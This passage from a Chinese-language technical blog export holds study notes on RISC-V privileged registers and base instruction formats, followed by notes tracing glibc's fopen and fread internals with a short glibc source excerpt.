<li><p><strong>解释</strong>：这些扩展字段用于标识处理器支持的特性。例如，支持浮点运算的处理器会在 <code>F</code> 或 <code>D</code> 位上设置相应的值，而支持用户模式和管理模式的处理器则会设置 <code>U</code> 和 <code>S</code> 位。</p>
</li>
</ul>
<hr>
<h4 id="表-3-2：misa-中-Extensions-字段的编码"><a href="#表-3-2：misa-中-Extensions-字段的编码" class="headerlink" title="表 3.2：misa 中 Extensions 字段的编码"></a>表 3.2：<code>misa</code> 中 Extensions 字段的编码</h4><table>
<thead>
<tr>
<th>Bit</th>
<th>Character</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>A</td>
<td>原子操作扩展</td>
</tr>
<tr>
<td>1</td>
<td>B</td>
<td>暂时保留，用于位操作扩展</td>
</tr>
<tr>
<td>2</td>
<td>C</td>
<td>压缩扩展</td>
</tr>
<tr>
<td>3</td>
<td>D</td>
<td>双精度浮点数扩展</td>
</tr>
<tr>
<td>4</td>
<td>E</td>
<td>RV32E 基础 ISA</td>
</tr>
<tr>
<td>5</td>
<td>F</td>
<td>单精度浮点数扩展</td>
</tr>
<tr>
<td>6</td>
<td>G</td>
<td>额外标准扩展的组合</td>
</tr>
<tr>
<td>7</td>
<td>H</td>
<td>保留</td>
</tr>
<tr>
<td>8</td>
<td>I</td>
<td>基础整数 ISA</td>
</tr>
<tr>
<td>9</td>
<td>J</td>
<td>暂时保留，用于动态翻译语言扩展</td>
</tr>
<tr>
<td>10</td>
<td>K</td>
<td>保留</td>
</tr>
<tr>
<td>11</td>
<td>L</td>
<td>暂时保留，用于十进制浮点扩展</td>
</tr>
<tr>
<td>12</td>
<td>M</td>
<td>整数乘除扩展</td>
</tr>
<tr>
<td>13</td>
<td>N</td>
<td>用户级中断支持</td>
</tr>
<tr>
<td>14</td>
<td>O</td>
<td>保留</td>
</tr>
<tr>
<td>15</td>
<td>P</td>
<td>暂时保留，用于打包 SIMD 扩展</td>
</tr>
<tr>
<td>16</td>
<td>Q</td>
<td>四倍精度浮点数扩展</td>
</tr>
<tr>
<td>17</td>
<td>R</td>
<td>保留</td>
</tr>
<tr>
<td>18</td>
<td>S</td>
<td>管理模式支持</td>
</tr>
<tr>
<td>19</td>
<td>T</td>
<td>暂时保留，用于事务内存扩展</td>
</tr>
<tr>
<td>20</td>
<td>U</td>
<td>用户模式支持</td>
</tr>
<tr>
<td>21</td>
<td>V</td>
<td>暂时保留，用于向量扩展</td>
</tr>
<tr>
<td>22</td>
<td>W</td>
<td>保留</td>
</tr>
<tr>
<td>23</td>
<td>X</td>
<td>非标准扩展支持</td>
</tr>
<tr>
<td>24</td>
<td>Y</td>
<td>保留</td>
</tr>
<tr>
<td>25</td>
<td>Z</td>
<td>保留</td>
</tr>
</tbody></table>
<ul>
<li><strong>解释</strong>：这张表格详细列出了 <code>misa</code> 扩展字段的每个位的含义。例如，<code>A</code> 位（bit 0）如果被置位，表示处理器支持原子操作扩展；<code>M</code> 位（bit 12）如果被置位，表示处理器支持整数乘除扩展。<code>S</code> 位和 <code>U</code> 位分别表示支持管理模式和用户模式。</li>
</ul>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li><strong><code>misa</code> 寄存器</strong> 是一个非常重要的寄存器，用于报告处理器支持的指令集结构和扩展。</li>
<li><strong><code>MXL</code> 字段</strong> 决定了基础整数 ISA 的宽度（32 位、64 位或 128 位），可以通过这个字段配置处理器的宽度。</li>
<li><strong>Extensions 字段</strong> 列出了处理器支持的各种标准扩展，如浮点扩展（F&#x2F;D&#x2F;Q）、原子操作扩展（A）、整数乘除扩展（M）等。</li>
<li><strong>用户模式（U）和管理模式（S）</strong> 支持也由 <code>misa</code> 寄存器中的特定位控制。</li>
</ol>
<p>通过读取和设置 <code>misa</code> 寄存器，可以很方便地了解到当前处理器的支持特性和架构，确保操作系统或应用程序能够根据处理器功能正确地运行。</p>
<h3 id="3-1-2-机器供应商-ID-寄存器（mvendorid）"><a href="#3-1-2-机器供应商-ID-寄存器（mvendorid）" class="headerlink" title="3.1.2 机器供应商 ID 寄存器（mvendorid）"></a>3.1.2 机器供应商 ID 寄存器（<code>mvendorid</code>）</h3><h3 id="3-1-3-机器架构-ID-寄存器（marchid）"><a href="#3-1-3-机器架构-ID-寄存器（marchid）" class="headerlink" title="3.1.3 机器架构 ID 寄存器（marchid）"></a>3.1.3 机器架构 ID 寄存器（<code>marchid</code>）</h3><h3 id="3-1-4-机器实现-ID-寄存器（mimpid）"><a href="#3-1-4-机器实现-ID-寄存器（mimpid）" class="headerlink" title="3.1.4 机器实现 ID 寄存器（mimpid）"></a>3.1.4 机器实现 ID 寄存器（<code>mimpid</code>）</h3><h3 id="3-1-5-硬件线程-ID-寄存器（mhartid）"><a href="#3-1-5-硬件线程-ID-寄存器（mhartid）" class="headerlink" title="3.1.5 硬件线程 ID 寄存器（mhartid）"></a>3.1.5 硬件线程 ID 寄存器（<code>mhartid</code>）</h3><p><code>mhartid</code> CSR 是一个只读寄存器，包含正在运行代码的硬件线程（hart）的整数 ID。该寄存器必须在所有实现中可读。在多处理器系统中，硬件线程的 ID 可能不是连续编号的，但至少有一个 hart 的 ID 必须为 0。</p>
<ul>
<li><strong>解释</strong>：<code>mhartid</code> 寄存器用于唯一标识当前正在运行的硬件线程（或处理器核心）。多核处理器系统中的每个核心（或硬件线程）都有一个唯一的 hart ID。这个寄存器是只读的，并且至少有一个 hart 的 ID 是 0，通常这是主 hart。</li>
</ul>
<h3 id="3-1-6-Machine-Status-Register-mstatus"><a href="#3-1-6-Machine-Status-Register-mstatus" class="headerlink" title="3.1.6 Machine Status Register (mstatus)"></a>3.1.6 Machine Status Register (mstatus)</h3><blockquote>
<p>The mstatus register keeps track of and controls the hart’s current operating state</p>
</blockquote>
<p><img src="/img/mypic/ucore/image-20240905175509846.png" alt="image-20240905175509846"></p>
<h3 id="3-1-7-Privilege-and-Global-Interrupt-Enable-Stack-in-mstatus-register"><a href="#3-1-7-Privilege-and-Global-Interrupt-Enable-Stack-in-mstatus-register" class="headerlink" title="3.1.7 Privilege and Global Interrupt-Enable Stack in mstatus register"></a>3.1.7 Privilege and Global Interrupt-Enable Stack in mstatus register</h3><blockquote>
<p>为了支持嵌套的中断或异常（即陷阱），每个特权级别的处理器都维护了两层栈，分别用于存储中断使能状态和特权模式状态。这种机制可以确保系统在处理中断时，能够正确保存和恢复之前的状态。</p>
<p>每个特权模式都提供了中断使能位：<strong>MIE</strong>（机器模式中断使能）、<strong>SIE</strong>（管理模式中断使能）和 <strong>UIE</strong>（用户模式中断使能）。这些位主要用于确保当前特权级别下中断处理程序的原子性。当 hart 在特权模式 x 中执行时，只有当 <strong>xIE &#x3D; 1</strong> 时，才会使能该模式下的中断。较低特权模式的中断始终被禁用，而较高特权模式的中断始终是启用的。较高特权级别的代码可以使用单独的每个中断的使能位，在将控制权交给较低特权模式之前禁用选定的中断。</p>
<p>为了支持嵌套的陷阱（traps），每个特权模式 <strong>x</strong> 都有两级的中断使能位和特权模式栈。<strong>xPIE</strong> 保存的是进入陷阱前中断使能位的值，而 <strong>xPP</strong> 保存的是之前的特权模式。<strong>xPP</strong> 字段只能保存特权模式 <strong>x</strong> 及以下的特权模式（因为无法从高权限陷入低权限的中断），因此 <strong>MPP</strong>（机器模式之前的特权模式）为两位宽，<strong>SPP</strong>（超级模式之前的特权模式）为一位宽，而 <strong>UPP</strong>（用户模式之前的特权模式）隐式为零。当从特权模式 <strong>y</strong> 进入特权模式 <strong>x</strong> 触发陷阱时，<strong>xPIE</strong> 被设置为 <strong>xIE</strong> 的值，<strong>xIE</strong> 被设置为 0，<strong>xPP</strong> 被设置为 <strong>y</strong>。</p>
<p>example： When a trap is taken from privilege mode y into privilege mode x, xPIE is set to the value of x IE; x IE is set to 0; and xPP is set to y.（xIE设置为0，有效的避免了中断嵌套）</p>
<p>The MRET, SRET, or URET instructions are used to return from traps in M-mode, S-mode, or U-mode respectively. When executing an xRET instruction, supposing xPP holds the value y, x IE is set to xPIE; the privilege mode is changed to y; xPIE is set to 1; and xPP is set to U (or M if user-mode is not supported).</p>
</blockquote>
<h3 id="3-1-8-Base-ISA-Control-in-mstatus-Register"><a href="#3-1-8-Base-ISA-Control-in-mstatus-Register" class="headerlink" title="3.1.8 Base ISA Control in mstatus Register"></a>3.1.8 Base ISA Control in mstatus Register</h3><blockquote>
<p><strong><code>misa</code></strong> 定义的是整个处理器的基本架构，但是为了保证不同权限模式之间的隔离，必须通过 <strong><code>mstatus</code></strong> 对每个模式下的字长进行控制。这样，可以保证某些模式（如用户模式）的操作不会超出定义的位宽范围，避免安全隐患。</p>
</blockquote>
<h3 id="3-1-9-Memory-Privilege-in-mstatus-Register"><a href="#3-1-9-Memory-Privilege-in-mstatus-Register" class="headerlink" title="3.1.9 Memory Privilege in mstatus Register"></a>3.1.9 Memory Privilege in mstatus Register</h3><blockquote>
<p> <strong>mstatus</strong> 寄存器中的这些位控制不同模式下内存访问的行为，确保系统在处理内存时既灵活又安全。</p>
</blockquote>
<h3 id="3-1-10-Virtualization-Support-in-mstatus-Register"><a href="#3-1-10-Virtualization-Support-in-mstatus-Register" class="headerlink" title="3.1.10 Virtualization Support in mstatus Register"></a>3.1.10 Virtualization Support in mstatus Register</h3><blockquote>
<p>虚拟化相关</p>
</blockquote>
<h3 id="3-1-11-Extension-Context-Status-in-mstatus-Register"><a href="#3-1-11-Extension-Context-Status-in-mstatus-Register" class="headerlink" title="3.1.11 Extension Context Status in mstatus Register"></a>3.1.11 Extension Context Status in mstatus Register</h3><h3 id="3-1-12-Machine-Trap-Vector-Base-Address-Register-mtvec"><a href="#3-1-12-Machine-Trap-Vector-Base-Address-Register-mtvec" class="headerlink" title="3.1.12 Machine Trap-Vector Base-Address Register (mtvec)"></a>3.1.12 Machine Trap-Vector Base-Address Register (mtvec)</h3><blockquote>
<p><strong><code>mtvec</code></strong> 是一个机器模式下的陷阱向量基地址寄存器。它用于指定异常或中断发生时处理程序的入口地址。当处理器发生异常或中断时，会跳转到由 <strong><code>mtvec</code></strong> 定义的地址去执行相应的处理程序。</p>
</blockquote>
<h3 id="3-1-13-Machine-Trap-Delegation-Registers-medeleg-and-mideleg"><a href="#3-1-13-Machine-Trap-Delegation-Registers-medeleg-and-mideleg" class="headerlink" title="3.1.13 Machine Trap Delegation Registers (medeleg and mideleg)"></a>3.1.13 Machine Trap Delegation Registers (medeleg and mideleg)</h3><blockquote>
<p><strong><code>medeleg</code></strong> 和 <strong><code>mideleg</code></strong> 寄存器用于将异常和中断从机器模式（M 模式）委派到管理模式（S 模式）。**<code>medeleg</code>** 用于控制哪些异常可以委派，而 <strong><code>mideleg</code></strong> 用于控制哪些中断可以委派。如果设置了某个位，则相应的异常或中断将在 S 模式下处理，而不是机器模式。</p>
</blockquote>
<h3 id="3-1-14-Machine-Interrupt-Registers-mip-and-mie"><a href="#3-1-14-Machine-Interrupt-Registers-mip-and-mie" class="headerlink" title="3.1.14 Machine Interrupt Registers (mip and mie)"></a>3.1.14 Machine Interrupt Registers (mip and mie)</h3><blockquote>
<p><strong><code>mip</code></strong> 和 <strong><code>mie</code></strong> 是机器模式下的中断挂起和中断使能寄存器。**<code>mip</code>** 保存了当前挂起的中断类型，表示哪些中断已经发生。而 <strong><code>mie</code></strong> 是中断使能寄存器，控制哪些类型的中断可以被处理器响应。通过这两个寄存器，处理器可以管理和响应不同类型的中断。</p>
</blockquote>
<h3 id="3-1-15-Machine-Timer-Registers-mtime-and-mtimecmp"><a href="#3-1-15-Machine-Timer-Registers-mtime-and-mtimecmp" class="headerlink" title="3.1.15 Machine Timer Registers (mtime and mtimecmp)"></a>3.1.15 Machine Timer Registers (mtime and mtimecmp)</h3><blockquote>
<p><strong><code>mtime</code></strong> 和 <strong><code>mtimecmp</code></strong> 是机器模式下的定时器寄存器。**<code>mtime</code>** 记录了一个持续递增的计数值，用于定时操作。**<code>mtimecmp</code>** 保存了一个定时器比较值，当 <strong><code>mtime</code></strong> 达到 <strong><code>mtimecmp</code></strong> 的值时，会触发定时器中断。这通常用于实现操作系统的时钟中断或时间调度功能</p>
</blockquote>
<h3 id="3-1-16-Hardware-Performance-Monitor"><a href="#3-1-16-Hardware-Performance-Monitor" class="headerlink" title="3.1.16 Hardware Performance Monitor"></a>3.1.16 Hardware Performance Monitor</h3><blockquote>
<p>RISC-V 架构提供的硬件性能监控寄存器用于跟踪各种性能事件，如指令计数、缓存命中等。它们帮助开发者分析和优化程序的性能。</p>
</blockquote>
<h3 id="3-1-17-Counter-Enable-Registers-m-h-s-counteren"><a href="#3-1-17-Counter-Enable-Registers-m-h-s-counteren" class="headerlink" title="3.1.17 Counter-Enable Registers ([m|h|s]counteren)"></a>3.1.17 Counter-Enable Registers ([m|h|s]counteren)</h3><blockquote>
<p>​	这些寄存器控制哪些性能计数器可用于不同的权限模式（机器、超级或用户模式）。如果某一模式下的相应位未启用，计数器将无法被访问。</p>
</blockquote>
<h3 id="3-1-18-Machine-Scratch-Register-mscratch"><a href="#3-1-18-Machine-Scratch-Register-mscratch" class="headerlink" title="3.1.18 Machine Scratch Register (mscratch)"></a>3.1.18 Machine Scratch Register (mscratch)</h3><blockquote>
<p><code>mscratch</code> 是一个临时存储寄存器，供操作系统在处理陷阱时保存上下文信息。</p>
</blockquote>
<h3 id="3-1-19-Machine-Exception-Program-Counter-mepc"><a href="#3-1-19-Machine-Exception-Program-Counter-mepc" class="headerlink" title="3.1.19 Machine Exception Program Counter (mepc)"></a>3.1.19 Machine Exception Program Counter (mepc)</h3><blockquote>
<p><code>mepc</code> 保存导致异常的指令的地址。当异常处理完成后，系统可以通过此寄存器返回到该指令。</p>
</blockquote>
<h3 id="3-1-20-Machine-Cause-Register-mcause"><a href="#3-1-20-Machine-Cause-Register-mcause" class="headerlink" title="3.1.20 Machine Cause Register (mcause)"></a>3.1.20 Machine Cause Register (mcause)</h3><blockquote>
<p><code>mcause</code> 寄存器存储了引发异常或中断的原因。它包含一个字段用于标识异常类型，以及一个字段指示异常的来源是中断还是其他类型的异常。</p>
</blockquote>
<h3 id="3-1-21-Machine-Trap-Value-mtval-Register"><a href="#3-1-21-Machine-Trap-Value-mtval-Register" class="headerlink" title="3.1.21 Machine Trap Value (mtval) Register"></a>3.1.21 Machine Trap Value (mtval) Register</h3><blockquote>
<p><code>mtval</code> 在某些异常中保存额外的故障信息。比如，对于页错误异常，它可能存储引发异常的虚拟地址，帮助调试和错误处理。</p>
</blockquote>
<h2 id="3-2-Machine-Mode-Privileged-Instructions"><a href="#3-2-Machine-Mode-Privileged-Instructions" class="headerlink" title="3.2 Machine-Mode Privileged Instructions"></a>3.2 Machine-Mode Privileged Instructions</h2><h3 id="3-2-1-Environment-Call-and-Breakpoint"><a href="#3-2-1-Environment-Call-and-Breakpoint" class="headerlink" title="3.2.1 Environment Call and Breakpoint"></a>3.2.1 Environment Call and Breakpoint</h3><h3 id="3-2-2-Trap-Return-Instructions"><a href="#3-2-2-Trap-Return-Instructions" class="headerlink" title="3.2.2 Trap-Return Instructions"></a>3.2.2 Trap-Return Instructions</h3><h3 id="3-2-3-Wait-for-Interrupt"><a href="#3-2-3-Wait-for-Interrupt" class="headerlink" title="3.2.3 Wait for Interrupt"></a>3.2.3 Wait for Interrupt</h3><h2 id="3-3-Reset"><a href="#3-3-Reset" class="headerlink" title="3.3 Reset"></a>3.3 Reset</h2><h2 id="3-4-Non-Maskable-Interrupts"><a href="#3-4-Non-Maskable-Interrupts" class="headerlink" title="3.4 Non-Maskable Interrupts"></a>3.4 Non-Maskable Interrupts</h2><h2 id="3-5-Physical-Memory-Attributes"><a href="#3-5-Physical-Memory-Attributes" class="headerlink" title="3.5 Physical Memory Attributes"></a>3.5 Physical Memory Attributes</h2>]]></content>
      <categories>
        <category>ucore</category>
      </categories>
      <tags>
        <tag>ucore</tag>
        <tag>riscv</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv指令</title>
    <url>/2024/08/31/ucore%E5%AE%9E%E9%AA%8C/riscv%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p><a href="https://riscv.org/wp-content/uploads/2017/05/riscv-spec-v2.2.pdf">https://riscv.org/wp-content/uploads/2017/05/riscv-spec-v2.2.pdf</a></p>
</blockquote>
<h2 id="1-异常中断与陷阱"><a href="#1-异常中断与陷阱" class="headerlink" title="1.异常中断与陷阱"></a>1.异常中断与陷阱</h2><p>我们使用术语“异常（exception）”来指代在当前RISC-V线程中，与指令运行时相关联的非正常情况。我们使用术语“陷阱（trap）”来指代因RISC-V线程中发生的异常情况而引发的同步控制转移至陷阱处理程序。陷阱处理程序通常在更加特权的环境中执行。</p>
<p>我们使用术语“中断（interrupt）”来指代一个与当前RISC-V线程异步发生的外部事件。当必须处理的中断发生时，某条指令会被选中接收到中断异常，随后引发陷阱。</p>
<p>接下来的章节描述了在执行过程中会引发异常的条件。这些条件如何转变为陷阱取决于执行环境，尽管大多数情况下，当发生异常时，系统通常会引发精确陷阱（precise trap）（除了标准浮点扩展中的浮点异常，这种异常不会引发陷阱）。</p>
<p>就像实验里看到的那样，异常是强制处理的，而中断是可控的，他们都会陷入（trap）处理程序</p>
<h2 id="2-base-integer-subset"><a href="#2-base-integer-subset" class="headerlink" title="2.base integer subset"></a>2.base integer subset</h2><p><img src="/img/mypic/ucore/image-20240906204343875.png" alt="image-20240906204343875"></p>
<h2 id="3-instruction-format"><a href="#3-instruction-format" class="headerlink" title="3.instruction format"></a>3.instruction format</h2><blockquote>
<p>总体分为四种</p>
</blockquote>
<p><img src="/img/mypic/ucore/image-20240906205422774.png" alt="image-20240906205422774"></p>
<p><strong>四种核心指令格式</strong>：</p>
<ul>
<li>R-type（寄存器类型）：用于纯寄存器到寄存器的操作。</li>
<li>I-type（立即数类型）：用于包含立即数的指令，立即数与寄存器进行操作。</li>
<li>S-type（存储类型）：用于存储指令，将数据存储到内存中。</li>
<li>U-type（上半部分立即数类型）：用于加载大数值，特别是32位宽的立即数。</li>
</ul>
<p><strong>对齐要求</strong>：</p>
<ul>
<li>指令的长度为固定的32位，并且必须在内存中按照4字节边界对齐。如果在分支或跳转时，目标地址未对齐，会生成地址未对齐异常。</li>
<li>如果有16位或16位倍数的扩展指令加入，指令的对齐要求可以放宽到2字节边界。</li>
</ul>
<p><strong>立即数扩展</strong>：</p>
<ul>
<li>各指令类型中的立即数通常使用符号扩展（sign-extended），尤其是最高位（bit 31）保留为符号位，以简化硬件的符号扩展操作。</li>
</ul>
<p><strong>统一寄存器位置</strong>：</p>
<ul>
<li>在所有指令格式中，寄存器的位置（如<code>rs1</code>、<code>rs2</code>和<code>rd</code>）被设计为在同一个位置，以简化指令解码。</li>
</ul>
<h3 id="3-1-extented-instruction-format"><a href="#3-1-extented-instruction-format" class="headerlink" title="3.1 extented instruction format"></a>3.1 extented instruction format</h3><blockquote>
<p>There are a further two variants of the instruction formats (B&#x2F;J) based on the handling of immediates</p>
<p>进一步的变体，为B和J型指令，S型指令的立即数最低位是空闲的，因此可以给B型指令的最高位。</p>
<p>因为S指令要左移2位，而B只需左移一位，因此需要上述调整</p>
<p>同理，J型指令和U型指令也是这个意思</p>
<p>U型格式和J型格式的唯一区别在于，20位的立即数在U型格式中左移12位以形成U型立即数，而在J型格式中左移1位以形成J型立即数。U型和J型格式中立即数字段的位置选择是为了最大限度地与其他格式以及彼此之间重叠。</p>
</blockquote>
<p><img src="/img/mypic/ucore/image-20240906211043005.png" alt="image-20240906211043005"></p>
<h2 id="4-Basic-Instructions"><a href="#4-Basic-Instructions" class="headerlink" title="4.Basic Instructions"></a>4.Basic Instructions</h2><blockquote>
<p>这一部分讲解基本指令，不涉及扩展,RISCV-32</p>
</blockquote>
<h3 id="4-1-Integer-Computational-Instructions"><a href="#4-1-Integer-Computational-Instructions" class="headerlink" title="4.1 Integer Computational Instructions"></a>4.1 Integer Computational Instructions</h3><blockquote>
<p>Integer computational instructions are either encoded as register-immediate operations using the I-type format or as register-register operations using the R-type format. The destination is register rd for both register-immediate and register-register instructions. No integer computational instructions cause arithmetic exceptions.</p>
<p>多为R型，I型，U型指令</p>
</blockquote>
<p><img src="/img/mypic/ucore/image-20240906213200504.png" alt="image-20240906213200504"></p>
<blockquote>
<p><strong>ADDI</strong> adds the sign-extended 12-bit immediate to register rs1. Arithmetic overflow is ignored and the result is simply the low XLEN bits of the result. ADDI rd, rs1, 0 is used to implement the MV rd, rs1 assembler pseudo-instruction.</p>
<p>**SLTI (set less than immediate) **places the value 1 in register rd if register rs1 is less than the signextended immediate when both are treated as signed numbers, else 0 is written to rd. SLTIU is similar but compares the values as unsigned numbers (i.e., the immediate is first sign-extended to XLEN bits then treated as an unsigned number). Note, SLTIU rd, rs1, 1 sets rd to 1 if rs1 equals zero, otherwise sets rd to 0 (assembler pseudo-op SEQZ rd, rs).</p>
<p><strong>ANDI, ORI, XORI</strong> are logical operations that perform bitwise AND, OR, and XOR on register rs1 and the sign-extended 12-bit immediate and place the result in rd. Note, XORI rd, rs1, -1 performs a bitwise logical inversion of register rs1 (assembler pseudo-instruction NOT rd, rs).</p>
</blockquote>
<p><img src="/img/mypic/ucore/image-20240906214339823.png" alt="image-20240906214339823"></p>
<blockquote>
<p>Shifts by a constant are encoded as a specialization of the I-type format. The operand to be shifted is in rs1, and the shift amount is encoded in the lower 5 bits of the I-immediate field. The right shift type is encoded in a high bit of the I-immediate. SLLI is a logical left shift (zeros are shifted into the lower bits); SRLI is a logical right shift (zeros are shifted into the upper bits); and SRAI is an arithmetic right shift (the original sign bit is copied into the vacated upper bits).</p>
</blockquote>
<p><img src="/img/mypic/ucore/image-20240906214940669.png" alt="image-20240906214940669"></p>
<blockquote>
<p>**LUI (load upper immediate) **is used to build 32-bit constants and uses the U-type format. LUI places the U-immediate value in the top 20 bits of the destination register rd, filling in the lowest 12 bits with zeros.</p>
<p><strong>AUIPC (add upper immediate to pc)</strong> is used to build pc-relative addresses and uses the U-type format. AUIPC forms a 32-bit offset from the 20-bit U-immediate, filling in the lowest 12 bits with zeros, adds this offset to the pc, then places the result in register rd.</p>
</blockquote>
<p><img src="/img/mypic/ucore/image-20240906215443959.png" alt="image-20240906215443959"></p>
<blockquote>
<p>ADD and SUB perform addition and subtraction respectively. Overflows are ignored and the low XLEN bits of results are written to the destination. SLT and SLTU perform signed and unsigned compares respectively, writing 1 to rd if rs1 &lt; rs2, 0 otherwise. Note, SLTU rd, x0, rs2 sets rd to 1 if rs2 is not equal to zero, otherwise sets rd to zero (assembler pseudo-op SNEZ rd, rs). AND, OR, and XOR perform bitwise logical operations. SLL, SRL, and SRA perform logical left, logical right, and arithmetic right shifts on the value in register rs1 by the shift amount held in the lower 5 bits of register rs2</p>
<p>需要注意的是，移位指令只有寄存器中的低五位是有效的</p>
</blockquote>
<p><img src="/img/mypic/ucore/image-20240906235027623.png" alt="image-20240906235027623"></p>
<blockquote>
<p>The NOP instruction does not change any user-visible state, except for advancing the pc. NOP is encoded as ADDI x0, x0, 0.</p>
<p>可以用来particular对齐，或者inline代码嵌入</p>
</blockquote>
<h3 id="4-2-Control-Transfer-Instructions"><a href="#4-2-Control-Transfer-Instructions" class="headerlink" title="4.2 Control Transfer Instructions"></a>4.2 Control Transfer Instructions</h3><blockquote>
<p>主要提供了两种，一种条件跳转，一种无条件跳转</p>
</blockquote>
<h4 id="4-2-1-Unconditional-Jumps"><a href="#4-2-1-Unconditional-Jumps" class="headerlink" title="4.2.1 Unconditional Jumps"></a>4.2.1 Unconditional Jumps</h4><blockquote>
<p>主要是JAL和JALR指令，分别以J型和I型的格式编码，因此跳转的地址范围有所不同，并且目标地址的计算方式也不同。</p>
<p><strong>JAL</strong>:The offset is sign-extended and added to the pc to form the jump target address. Jumps can therefore target a ±1 MiB range. JAL stores the address of the instruction following the jump (pc+4) into register rd</p>
<p>Plain unconditional jumps (assembler pseudo-op J) are encoded as a JAL with rd&#x3D;x0.</p>
<p><strong>JALR</strong>:The indirect jump instruction JALR (jump and link register) uses the I-type encoding. The target address is obtained by adding the 12-bit signed I-immediate to the register rs1, then setting the least-significant bit of the result to zero. The address of the instruction following the jump (pc+4) is written to register rd. Register x0 can be used as the destination if the result is not required.</p>
<p>The standard software calling convention uses x1 as the return address register and x5 as an alternate link register.</p>
<p><strong>x1</strong> 是主要的返回地址寄存器，处理一般的函数调用。</p>
<p><strong>x5</strong> 是备用寄存器，在某些特殊情况下用作保存临时返回地址，避免与 <strong>x1</strong> 冲突。</p>
<p>细节：关于返回地址调用栈</p>
</blockquote>
<p><img src="/img/mypic/ucore/image-20240907000155135.png" alt="image-20240907000155135"></p>
<p><img src="/img/mypic/ucore/image-20240907000208609.png" alt="image-20240907000208609"></p>
<h4 id="4-2-2Conditional-Jumps"><a href="#4-2-2Conditional-Jumps" class="headerlink" title="4.2.2Conditional Jumps"></a>4.2.2Conditional Jumps</h4><blockquote>
<p>All branch instructions use the B-type instruction format. The 12-bit B-immediate encodes signed offsets in multiples of 2, and is added to the current pc to give the target address. The conditional branch range is ±4 KiB.</p>
</blockquote>
<p><img src="/img/mypic/ucore/image-20240907003421985.png" alt="image-20240907003421985"></p>
<blockquote>
<p>Branch instructions compare two registers. BEQ and BNE take the branch if registers rs1 and rs2 are equal or unequal respectively. BLT and BLTU take the branch if rs1 is less than rs2, using signed and unsigned comparison respectively. BGE and BGEU take the branch if rs1 is greater than or equal to rs2, using signed and unsigned comparison respectively. Note, BGT, BGTU, BLE, and BLEU can be synthesized by reversing the operands to BLT, BLTU, BGE, and BGEU, respectively.</p>
<p>软件应该根据架构的分支预测特性来优化代码。</p>
</blockquote>
<h3 id="4-3-Load-and-Store-Instructions"><a href="#4-3-Load-and-Store-Instructions" class="headerlink" title="4.3 Load and Store Instructions"></a>4.3 Load and Store Instructions</h3>]]></content>
      <categories>
        <category>ucore</category>
      </categories>
      <tags>
        <tag>ucore</tag>
        <tag>riscv</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE函数分析</title>
    <url>/2024/08/14/userpwn/IO-FILE%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h1><blockquote>
<p>在前人的基础上做一下总结和探索</p>
</blockquote>
<h2 id="执行链"><a href="#执行链" class="headerlink" title="执行链"></a>执行链</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__fopen_internal(iofopen.c)-&gt;_IO_no_init-&gt;  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">_IO_new_file_fopen-&gt;_IO_file_open</span><br></pre></td></tr></table></figure>

<h2 id="执行细节"><a href="#执行细节" class="headerlink" title="执行细节"></a>执行细节</h2><ul>
<li><p>标志位：</p>
<p>在执行过程中将oflags |omode作为系统调用的模式参数，read_write参数则作为flags传递个iofile结构体</p>
</li>
<li><p>光标定位（通过判断flag进行）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">     update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">	&#123;</span><br><span class="line">	  __close_nocancel (fdesc);</span><br><span class="line">	  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>总结来说，打开一个文件会先分配文件结构体，也就是iofile对象，之后会初始化iofile结构体，如一些flag的置位，虚表的赋值等等，然后会去处理用户输入的模式字段，来进行posix模式和flag的置位，也就是读，写，执行，追加。之后会利用系统调用open打开文件并返还文件描述符，最后完成文件结构的flag置位即可。</p>
<h2 id="亟待解决"><a href="#亟待解决" class="headerlink" title="亟待解决"></a>亟待解决</h2><p>宽字符处理</p>
<h1 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h1><h2 id="执行链-1"><a href="#执行链-1" class="headerlink" title="执行链"></a>执行链</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_fread(iofread.c)-&gt;_IO_file_xsgetn(fileops.c)-&gt;_IO_doallocbuf(genops.c)-&gt;_IO_file_doallocate(filedoalloc.c)-&gt;_IO_new_file_underflow(fileops.c)</span><br></pre></td></tr></table></figure>

<h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><blockquote>
<p>1.判断有无缓冲区来分配缓冲区，如果没有缓冲区，会释放掉save缓冲区</p>
<p>2.维护一组指针来进行读操作，为：<code> _IO_read_end和_IO_read_ptr和_IO_read_base</code></p>
<p>3.总的来说就是如果缓冲区有数据，那么就把缓冲区中的数据copy到指定位置然后更新指针，然后通过判断剩余读写的数量来决定是把文件中的数据读到缓冲区中，还是直接通过系统调用来读取数据，也会判断是否需要刷新缓冲区。</p>
<p>4.主要的操作就是维护标志位和指针的位置，会有一些列安全检查。</p>
</blockquote>
<p><img src="/img/mypic/io/fread.png" alt="fread"></p>
